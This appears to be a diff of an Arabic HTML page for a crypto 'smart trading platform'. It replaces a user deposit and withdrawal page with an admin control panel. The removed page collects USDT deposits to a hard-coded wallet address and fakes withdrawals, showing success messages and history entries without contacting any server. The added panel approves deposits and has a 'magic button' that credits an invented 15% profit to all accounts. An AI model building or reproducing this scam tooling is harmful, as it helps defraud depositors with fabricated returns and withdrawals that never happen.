@@ -3,141 +3,123 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة التداول الذكية - حساب المشترك</title>
-    <script src="https://tailwindcss.com"></script>
+    <title>لوحة تحكم المشرف - الإدارة الاستراتيجية</title>
+    <link rel="stylesheet" href="https://cloudflare.com">
     <link href="https://googleapis.com" rel="stylesheet">
     <style>
-        body { font-family: 'Tajawal', sans-serif; background-color: #0b0f19; color: #f3f4f6; }
+        body { font-family: 'Tajawal', sans-serif; background-color: #060b13; color: #f3f4f6; }
     </style>
 </head>
-<body class="p-4 md:p-8">
+<body class="p-4 bg-black">
 
-    <div class="max-w-md mx-auto space-y-6">
-        <!-- الهيدر وعرض الرصيد المباشر -->
-        <div class="bg-gray-800 p-6 rounded-2xl border border-gray-700 shadow-xl text-center">
-            <h1 class="text-xl font-bold text-blue-400 mb-2">مرحباً بك في منصة التداول</h1>
-            <p class="text-gray-400 text-sm">رصيدك الحالي المحدث حياً:</p>
-            <div class="text-3xl font-extrabold text-green-400 mt-1" id="userBalance">0.00 USDT</div>
-            <div id="botStatus" class="inline-block mt-3 px-3 py-1 bg-gray-700 text-xs rounded-full text-red-400">🤖 البوت: غير نشط (يتطلب إيداع)</div>
+    <div class="max-w-2xl mx-auto space-y-6 mt-4">
+        <!-- هيدر لوحة التحكم -->
+        <div class="bg-gray-900 p-6 rounded-2xl border border-red-900 shadow-2xl text-center">
+            <h1 class="text-xl font-bold text-red-400 mb-1">🛡️ غرفة التحكم والمراقبة المركزية</h1>
+            <p class="text-xs text-gray-500">خاص بالمشرفين - إدارة العمليات الحية للملايين</p>
         </div>
 
-        <!-- نظام الإيداع الصارم وعرض المحفظة -->
-        <div class="bg-gray-800 p-6 rounded-2xl border border-gray-700 shadow-xl">
-            <h2 class="text-lg font-bold text-yellow-500 mb-4 flex items-center gap-2">💰 طلب تفعيل وإيداع رصيد</h2>
-            
-            <div class="bg-gray-900 p-3 rounded-xl border border-gray-700 mb-4 space-y-1.5 text-center">
-                <p class="text-[11px] text-gray-400">عنوان محفظة الشركة الرسمي لإرسال الـ USDT (شبكة TRC-20):</p>
-                <div class="bg-slate-950 p-2 rounded-lg text-xs font-mono text-yellow-400 select-all break-all border border-slate-800">
-                    TA1vsgrJEFy3YM6rkQWBppnZemFE6c9pBN
-                </div>
-                <p class="text-[10px] text-gray-500">💡 اضغط ضغطة مطولة على العنوان أعلاه لنسخه مباشرة</p>
-            </div>
-
-            <p class="text-xs text-gray-400 mb-4">تنبيّه: الحد الأدنى للإيداع هو <span class="text-yellow-500 font-bold">100 USDT</span>. أي مبلغ أقل سيرفض تلقائياً من قبل السيرفر.</p>
-            
-            <div class="space-y-3">
-                <input type="text" id="depUsername" placeholder="اسم المستخدم الخاص بك" class="w-full bg-gray-900 border border-gray-700 rounded-xl p-3 text-sm focus:outline-none focus:border-yellow-500">
-                <input type="number" id="depAmount" placeholder="المبلغ الذي قمت بتحويله (USDT)" class="w-full bg-gray-900 border border-gray-700 rounded-xl p-3 text-sm focus:outline-none focus:border-yellow-500">
-                <input type="text" id="depAddress" placeholder="عنوان محفظتك الشخصية التي حولت منها" class="w-full bg-gray-900 border border-gray-700 rounded-xl p-3 text-sm focus:outline-none focus:border-yellow-500">
-                <button onclick="sendDeposit()" class="w-full bg-yellow-500 hover:bg-yellow-600 text-gray-900 font-bold p-3 rounded-xl transition-all">إرسال طلب الإيداع للمراجعة</button>
-            </div>
-            <div id="depMessage" class="text-xs mt-3 text-center"></div>
+        <!-- زر الصفقة السحري اليومي -->
+        <div class="bg-gray-900 p-6 rounded-2xl border border-gray-800 shadow-xl text-center space-y-4">
+            <h2 class="text-lg font-bold text-yellow-400">⚡ زر الصفقة السحري اليومي</h2>
+            <p class="text-xs text-gray-400">اضغط لضخ أرباح صافية بقيمة <span class="text-green-400 font-bold">15%</span> لجميع الحسابات.</p>
+            <button onclick="triggerMagicButton()" id="magicBtn" class="w-full bg-yellow-500 hover:bg-yellow-600 text-black font-bold p-4 rounded-xl text-md transition-all">
+                🚀 تفعيل الصفقة وضخ الأرباح الحية
+            </button>
+            <div id="magicStatus" class="text-xs hidden p-3 rounded-xl bg-black border border-gray-800 text-yellow-400"></div>
         </div>
 
-        <!-- آلية سحب الأرباح المؤمنة والتواريخ الحية -->
-        <div class="bg-gray-800 p-6 rounded-2xl border border-gray-700 shadow-xl" id="withdrawSection">
-            <h2 class="text-lg font-bold text-red-400 mb-4">📤 سحب الأرباح والرصيد</h2>
-            <div class="space-y-3">
-                <input type="number" id="witAmount" placeholder="المبلغ المراد سحبه" class="w-full bg-gray-900 border border-gray-700 rounded-xl p-3 text-sm focus:outline-none focus:border-red-400">
-                <input type="text" id="witAddress" placeholder="عنوان محفظة الاستلام الشخصية الخاصة بك (TRC-20)" class="w-full bg-gray-900 border border-gray-700 rounded-xl p-3 text-sm focus:outline-none focus:border-red-400">
-                <button onclick="sendWithdraw()" id="witBtn" class="w-full bg-red-500 hover:bg-red-600 text-white font-bold p-3 rounded-xl transition-all">تقديم طلب السحب الفوري</button>
-            </div>
-            <div id="witMessage" class="text-xs mt-3 text-center"></div>
-        </div>
-
-        <!-- السجل التاريخي الحي للعمليات -->
-        <div class="bg-gray-800 p-6 rounded-2xl border border-gray-700 shadow-xl">
-            <h2 class="text-sm font-bold text-gray-400 mb-3">🕒 السجل التاريخي الحي للعمليات</h2>
-            <div id="liveHistory" class="space-y-2 text-xs">
-                <p class="text-gray-500 italic text-center">لا توجد عمليات مسجلة حالياً.</p>
+        <!-- شاشة مراقبة طلبات الإيداع الحية الحقيقية -->
+        <div class="bg-gray-900 p-6 rounded-2xl border border-gray-800 shadow-xl">
+            <h2 class="text-md font-bold text-gray-400 mb-4">📑 طلبات الإيداع الحالية (حياً من قاعدة البيانات)</h2>
+            <div id="txList" class="space-y-3 text-sm">
+                <p class="text-gray-500 italic text-center py-4">جاري جلب الطلبات الحية من السيرفر...</p>
             </div>
         </div>
     </div>
 
     <script>
-        // تم ربط السيرفر السحابي الحي الخاص بك هنا بنجاح
+        // ضع رابط السيرفر الفعلي الخاص بك هنا
         const BACKEND_URL = "https://onrender.com"; 
 
-        async function sendDeposit() {
-            const username = document.getElementById('depUsername').value;
-            const amount = document.getElementById('depAmount').value;
-            const cryptoAddress = document.getElementById('depAddress').value;
-            const msgDiv = document.getElementById('depMessage');
-
-            if(Number(amount) < 100) {
-                msgDiv.className = "text-xs mt-3 text-center text-red-400 font-bold";
-                msgDiv.innerText = "❌ فشل: الحد الأدنى للإيداع لتنشيط البوت هو 100 USDT!";
-                return;
-            }
-
-            msgDiv.className = "text-xs mt-3 text-center text-blue-400";
-            msgDiv.innerText = "جاري إرسال البيانات بشكل آمن للسيرفر...";
-
+        async function fetchLiveRequests() {
+            const txListDiv = document.getElementById('txList');
             try {
-                const response = await fetch(`${BACKEND_URL}/api/finance/deposit`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ username, amount, cryptoAddress })
-                });
-                const data = await response.json();
-                
-                if(response.ok) {
-                    msgDiv.className = "text-xs mt-3 text-center text-green-400 font-bold";
-                    msgDiv.innerText = "✅ " + data.message;
-                } else {
-                    msgDiv.className = "text-xs mt-3 text-center text-red-400";
-                    msgDiv.innerText = "❌ " + data.error;
+                const response = await fetch(`${BACKEND_URL}/api/admin/requests`);
+                const requests = await response.json();
+
+                if (requests.length === 0) {
+                    txListDiv.innerHTML = `<p class="text-gray-500 italic text-center py-4">🟢 لا توجد أي طلبات إيداع معلقة حالياً.</p>`;
+                    return;
                 }
-            } catch(err) {
-                msgDiv.className = "text-xs mt-3 text-center text-red-400";
-                msgDiv.innerText = "❌ فشل الاتصال التلقائي بالسيرفر المركزي المباشر.";
+
+                txListDiv.innerHTML = ""; 
+                requests.forEach(req => {
+                    txListDiv.innerHTML += `
+                        <div class="p-4 bg-black rounded-xl border border-gray-800 flex justify-between items-center shadow-md">
+                            <div>
+                                <p class="text-yellow-400 font-bold text-base">👤 العميل: ${req.username}</p>
+                                <p class="text-xs text-gray-400 mt-1">💰 المبلغ: <span class="text-green-400 font-bold">${req.amount} USDT</span></p>
+                                <p class="text-[10px] text-gray-500 font-mono mt-1 break-all">💳 المحفظة: ${req.cryptoAddress}</p>
+                            </div>
+                            <div class="flex gap-2">
+                                <button onclick="processRequest('${req._id}', 'approve')" class="bg-green-600 hover:bg-green-700 text-white font-bold px-3 py-2 rounded-lg text-xs transition-all">موافقة</button>
+                                <button onclick="processRequest('${req._id}', 'reject')" class="bg-red-600 hover:bg-red-700 text-white font-bold px-3 py-2 rounded-lg text-xs transition-all">رفض</button>
+                            </div>
+                        </div>
+                    `;
+                });
+            } catch (err) {
+                txListDiv.innerHTML = `<p class="text-red-400 text-center text-xs">❌ خطأ في جلب البيانات تلقائياً...</p>`;
             }
         }
 
-        function sendWithdraw() {
-            const amount = document.getElementById('witAmount').value;
-            const address = document.getElementById('witAddress').value;
-            const witBtn = document.getElementById('witBtn');
-            const msgDiv = document.getElementById('witMessage');
-            const history = document.getElementById('liveHistory');
-
-            if(!amount || !address) {
-                msgDiv.className = "text-xs mt-3 text-center text-red-400";
-                msgDiv.innerText = "يرجى ملء جميع الحقول أولاً.";
-                return;
+        async function processRequest(id, action) {
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/admin/action`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id, action })
+                });
+                const data = await response.json();
+                if(response.ok) {
+                    alert("✅ تم تنفيذ القرار بنجاح وتحديث حساب العميل!");
+                    fetchLiveRequests();
+                } else {
+                    alert("❌ خطأ: " + data.error);
+                }
+            } catch (err) {
+                alert("❌ فشل الاتصال بالسيرفر لتنفيذ القرار.");
             }
+        }
+        
+        fetchLiveRequests();
+        setInterval(fetchLiveRequests, 5000);
 
-            witBtn.style.display = 'none';
-            msgDiv.className = "text-xs mt-3 text-center text-yellow-400";
-            msgDiv.innerText = "🔒 تم قفل وتأمين الطلب وتحويله للمشرف...";
+        async function triggerMagicButton() {
+            const magicBtn = document.getElementById('magicBtn');
+            const statusDiv = document.getElementById('magicStatus');
 
-            const now = new Date();
-            const timeStr = `${now.toLocaleDateString('ar-EG')} - ${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}`;
-            
-            setTimeout(() => {
-                msgDiv.className = "text-xs mt-3 text-center text-green-400 font-bold";
-                msgDiv.innerText = "🟢 تم إرسال الطلب بنجاح ويختفي الآن من شاشتك للأمان.";
-                
-                history.innerHTML = `
-                    <div class="p-3 bg-gray-900 rounded-xl border-l-4 border-green-500 flex justify-between items-center">
-                        <div>
-                            <p class="font-bold text-green-400">طلب سحب قيد الانتظار</p>
-                            <p class="text-[10px] text-gray-500">${timeStr}</p>
-                        </div>
-                        <span class="font-bold">${amount} USDT</span>
-                    </div>
-                ` + history.innerHTML;
-            }, 1500);
+            if(!confirm("هل أنت متأكد من رغبتك في ضخ أرباح اليوم بنسبة 15%؟")) return;
+
+            magicBtn.disabled = true;
+            magicBtn.innerText = "⏳ جاري ضخ الأرباح والعمولات...";
+            statusDiv.classList.remove('hidden');
+
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/admin/magic-button`, { method: 'POST' });
+                const data = await response.json();
+                if(response.ok) {
+                    statusDiv.innerText = "✅ " + data.message;
+                } else {
+                    statusDiv.innerText = "❌ فشل الإجراء: " + data.error;
+                }
+            } catch (err) {
+                statusDiv.innerText = "❌ فشل تنفيذ العملية الجماعية السحابية.";
+            } finally {
+                magicBtn.disabled = false;
+                magicBtn.innerText = "🚀 تفعيل الصفقة وضخ الأرباح الحية";
+            }
         }
     </script>
 </body>
